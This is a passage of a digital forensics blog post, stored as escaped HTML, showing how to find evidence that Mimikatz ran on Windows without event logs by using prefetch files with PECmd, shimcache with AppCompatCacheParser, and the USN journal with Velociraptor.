&lt;li&gt;and finally, &lt;strong&gt;the console host history text file will &lt;a href=&#34;https://www.cloudsavvyit.com/8722/using-psreadline-in-powershell/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;not be available on all Windows OS’ and builds&lt;/a&gt;&lt;/strong&gt;&lt;a href=&#34;https://www.cloudsavvyit.com/8722/using-psreadline-in-powershell/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;.&lt;/strong&gt;&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Prefetch&lt;/h1&gt;&lt;p&gt;If you go to the directory &lt;code&gt;C:\Windows\Prefetch&lt;/code&gt; on a Windows &lt;strong&gt;endpoint&lt;/strong&gt;, you&amp;rsquo;re in for a treat. &lt;/p&gt;
&lt;p&gt;Prefetch (also known as prefetcher) is &lt;strong&gt;a caching technique&lt;/strong&gt; whereby an application is monitored and catalogued for the first few seconds it is launched, to make &lt;strong&gt;re-launching more efficient.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If this sounds like something awesome for &lt;a href=&#34;https://www.youtube.com/watch?v=f4RAtR_3zcs&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;a log-less investigation&lt;/a&gt;, then you’re right!&lt;/p&gt;
&lt;p&gt;If you sort by the prefetch files recently written to, &lt;strong&gt;you can see the executables recently deployed by both the user and the computer itself.&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;dir &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\Windows\Prefetch&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;sort &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LastWriteTime&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-desc&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/6-1024x683.png&#34; alt=&#34;6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If we look very closely at the prefetch files (.PF), we can see that &lt;strong&gt;Mimikatz&lt;/strong&gt; makes a special guest appearance!! This &lt;strong&gt;evidences that Mimikatz has been executed&lt;/strong&gt;, but we don&amp;rsquo;t get any more context from the name of the prefetch file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/7-edited-1.png&#34; alt=&#34;7&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;Prefetch: PECmd&lt;span class=&#34;absolute -mt-20&#34; id=&#34;prefetch-pecmd&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#prefetch-pecmd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The contents of a prefetch file cannot be simply read to gather more execution context! This is where &lt;a href=&#34;https://github.com/EricZimmerman/PECmd&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Eric Zimmerman’s PEcmd&lt;/a&gt; comes to save the day. &lt;strong&gt;This tool will carve through the prefetch directory or a prefetch file&lt;/strong&gt;, and &lt;strong&gt;make it easier for investigators&lt;/strong&gt; to see the discrete info about the prefetched data. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# I’d advise picking the -f flag, and picking on one of the prefetch files you see in the directory
.\PECmd .exe -f &amp;#39;C:\Windows\prefetch\MIMIKATZ.EXE-599C44B5.pf&amp;#39; 

#get granular timestamps by adding -mp flag
.\PECmd .exe -f &amp;#39;C:\Windows\prefetch\MIMIKATZ.EXE-599C44B5.pf&amp;#39; -mp

# If you don’t know what file you want to process, get the whole directory. Will be noisy though and I wouldn’t recommend
.\PECmd .exe -d &amp;#39;C:\Windows\Prefetch&amp;#39; --csv . #dot at the end means write in current directory&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/8-edited.png&#34; alt=&#34;8&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;You get a whole load more with PECmd. Let’s look in more detail at what you’re given. &lt;/p&gt;
&lt;p&gt;First, we can see the various times associated with this executable (creation, modification etc). We’re also told about the executable name and file size. Interestingly, on the last line &lt;strong&gt;we can see the amount of times the executable has been run&lt;/strong&gt; (once, on our instance) as well as the time it was last run.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/9.png&#34; alt=&#34;9&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Next, we are given &lt;strong&gt;insight into the directories and then the files that were involved in this execution&lt;/strong&gt; - this is again another excellent way to better map the granular behaviour the adversary had during their attack. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/10.png&#34; alt=&#34;10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Note that Eric Zimmerman is kind enough to highlight the offending executable. PEcmd can do even more if you want to &lt;a href=&#34;https://binaryforay.blogspot.com/2016/01/introducing-pecmd.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;check out some other blog posts and docs&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/11-1024x433.png&#34; alt=&#34;11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;There are some caveats for this second technique:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First, prefetch exists from Windows XP onwards, but PEcmd &lt;strong&gt;will only work from Windows 8 above;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Second, &lt;strong&gt;you don’t retrieve the arguments or parameters used&lt;/strong&gt; and so can only know the base executable that the adversary leveraged;&lt;/li&gt;
&lt;li&gt;Third, the relevancy of prefetch is &lt;strong&gt;time-based&lt;/strong&gt; - so if you do not collect it after an incident and the machine continues to be used then you may lose the evidence;&lt;/li&gt;
&lt;li&gt;Fourth and most important, &lt;strong&gt;prefetch has to be enabled on servers, as &lt;a href=&#34;https://www.forensicfocus.com/forums/mobile-forensics/prefetch-on-windows-servers/#:~:text=1.-,Is%20there%20a%20technical%20reason%20that%20this%20is%20off%3F,like%2C%20well%E2%80%A6running%20applications.&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Microsoft disables recording prefetch on Windows servers by default&lt;/a&gt;. It is enabled on normal Windows endpoints.&lt;/strong&gt; You can &lt;strong&gt;&lt;a href=&#34;https://truesecdev.wordpress.com/2015/11/25/how-to-enable-prefetch-in-windows-server/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;enable prefetch recording&lt;/a&gt;&lt;/strong&gt; with the following on a Windows Server:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;reg&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EnablePrefetcher&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REG_DWORD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;reg&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MaxPrefetchFiles&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REG_DWORD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;8192&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Enable-MMAgent&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OperationAPI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;start &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sysmain&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h1&gt;Shimcache&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Shimcache&lt;/a&gt; analysis is our third technique to gather insight into an attacker’s past activities. &lt;/p&gt;
&lt;p&gt;Shimcache - called AppCompatCache on a Windows machine - was originally made to determine interoperability issues between Windows versions and applications.  Like prefetch, &lt;a href=&#34;https://www.youtube.com/watch?v=7byz1dR_CLg&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;we can leverage shimcache to identify evidence of execution&lt;/a&gt; on a machine when we do not have event logs. &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ericzimmerman.github.io/#!index.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Another Eric Zimmerman tool&lt;/a&gt; called &lt;strong&gt;AppCompatCacheParser&lt;/strong&gt; can give us insight into what was run on the system. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppCompatCacheParser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-csv&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-csvf&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shimcache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;csv&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/12-edited.png&#34; alt=&#34;12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This will create a CSV, which you could import to your spreadsheet of choice… but some quick PowerShell can give you some visibility. There will be a lot of noise here, but if we filter through we can find something quite interesting.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;import-csv&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shimcache&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;csv&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;sort &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lastmodified&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Descending&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;fl &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;last&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/13-edited.png&#34; alt=&#34;13&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Despite not having access to the event logs, if we query &lt;strong&gt;shimcache we can see proof of Mimikatz’ execution&lt;/strong&gt;, once again. Shimcache is a relatively straightforward artefact to query. It does however have &lt;strong&gt;some complications&lt;/strong&gt;, as its implementation varies in Windows versions over the years. And again, if an investigator is not quick enough to gather the shimcache data then it may be lost!&lt;/p&gt;
&lt;h1&gt;BONUS: USN Journal&lt;/h1&gt;&lt;p&gt;The USN journal isn’t as easy an artefact to investigate as it is &lt;strong&gt;extremely&lt;/strong&gt; &lt;strong&gt;verbose.&lt;/strong&gt; I’ve included it as &lt;strong&gt;a bonus fourth tip&lt;/strong&gt;, in case the above three techniques fail to deliver you any insight for your log-less investigation. &lt;/p&gt;
&lt;p&gt;The USN journal leverages some of the artefacts we have previously encountered (like prefetch). &lt;strong&gt;It also can reach much further back&lt;/strong&gt; into the past, compared to other volatile artefacts, and identify files that were long deleted - excellent for DFIR purposes [&lt;a href=&#34;https://www.youtube.com/watch?v=1mwiShxREm8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;1&lt;/a&gt;, &lt;a href=&#34;https://www.youtube.com/watch?v=_qElVZJqlGY&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;2&lt;/a&gt;].&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Velocidex/velociraptor&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Dr Michael Cohen’s Velociraptor&lt;/a&gt; is an excellent tool to help us leverage the USN journal to see what an adversary did. Fortunately, there is &lt;a href=&#34;https://velociraptor.velocidex.com/carving-usn-journal-entries-72d5c66971da&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;a dedicated blog&lt;/a&gt; that offers step-by-step advice on how best to leverage Velociraptor to hunt USN details.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;I’d recommend Velociraptor for its low technical barrier&lt;/strong&gt; to &lt;a href=&#34;https://www.hackingarticles.in/threat-hunting-velociraptor-for-endpoint-monitoring/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;deploy many other advanced forensic techniques&lt;/a&gt;, including prefetch hunts.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3&gt;USN Journal: Velociraptor&lt;span class=&#34;absolute -mt-20&#34; id=&#34;usn-journal-velociraptor&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#usn-journal-velociraptor&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We can download Velociraptor on a machine we are investigating and launch it straight there - n&lt;strong&gt;o need to set up any server-client infrastructure&lt;/strong&gt;, when in an emergency: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;velociraptor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gui&lt;/span&gt;  &lt;span class=&#34;c&#34;&gt;#spin this up as admin&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/14-1024x395.png&#34; alt=&#34;14&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The web browser will pop up, and we will be met with Velociraptor&amp;rsquo;s GUI. We can traverse to the main hunting page and name our hunt. We can then pick the &lt;strong&gt;USN&lt;/strong&gt; &lt;strong&gt;forensic&lt;/strong&gt; &lt;strong&gt;hunt&lt;/strong&gt;, and fire it off.&lt;/p&gt;
&lt;p&gt;Whilst the results are being collected and parsed, we can write some VQL (&lt;a href=&#34;https://velociraptor.velocidex.com/the-velociraptor-query-language-pt-1-d721bff100bf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Velociraptor Query Language&lt;/a&gt;) to &lt;strong&gt;sort the results by timestamp&lt;/strong&gt;, and filter out some other headers we don’t care about: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Usn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;Timestamp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fullpath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FileAttributes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Reason&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SourceInfo&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ORDER&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;Timestamp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;desc&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In our USN journal results, we can see &lt;strong&gt;the relics of a Mimikatz&lt;/strong&gt; execution, along with the timestamp that we can use to map the adversaries timeline. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/15-edited-1.png&#34; alt=&#34;15&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Unfortunately, the USN journal is often &lt;strong&gt;challenging to navigate when used in a real life incident.&lt;/strong&gt; My arbitrary example with Mimikatz doesn’t quite convey the &lt;strong&gt;complexity&lt;/strong&gt; and &lt;strong&gt;verbosity&lt;/strong&gt; that you will face when leveraging the USN journal in a real investigation. For example, in our artificial scenario, just &lt;strong&gt;a few runs&lt;/strong&gt; of Mimikatz resulted in near &lt;strong&gt;97 rows&lt;/strong&gt; in the USN journal, via Velociraptor.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/16.png&#34; alt=&#34;16&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Burn the logs, see if I care!&lt;/h1&gt;&lt;p&gt;This has been an overview into a number of &lt;strong&gt;easy to use, highly-reliable, rapid digital forensics techniques&lt;/strong&gt;. I have found these techniques &lt;strong&gt;useful in investigations where the event logs can no longer be trusted or accessed&lt;/strong&gt; due to adversarial tampering, or perhaps where &lt;strong&gt;logging was not set up&lt;/strong&gt; in the first place by the client. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/elmo.png&#34; alt=&#34;elmo&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We have barely scratched the surface of digital forensics and incident response. There are still a whole load of techniques you can deploy when you find that Windows event logs cannot deliver you the puzzle pieces you need:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you want to read about &lt;strong&gt;amcache,&lt;/strong&gt; I can recommend this &lt;a href=&#34;https://www.ssi.gouv.fr/uploads/2019/01/anssi-coriin_2019-analysis_amcache.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;excellent paper&lt;/a&gt;&lt;/li&gt;
